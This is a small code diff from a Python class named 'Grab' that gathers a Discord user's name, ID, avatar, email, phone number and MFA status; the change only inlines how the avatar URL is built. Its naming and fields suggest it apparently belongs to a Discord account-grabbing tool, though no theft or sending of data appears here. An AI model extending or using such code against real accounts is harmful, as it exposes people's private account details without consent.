@@ -115,7 +115,7 @@ class Grab:
             "#" + str(user_data["discriminator"])
         user_id = user_data["id"]
         avatar_id = user_data["avatar"]
-        avatar_url = getavatar(user_id, avatar_id)
+        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
         email = user_data.get("email")
         phone = user_data.get("phone")
         mfa_enabled = bool(user_data['mfa_enabled'])
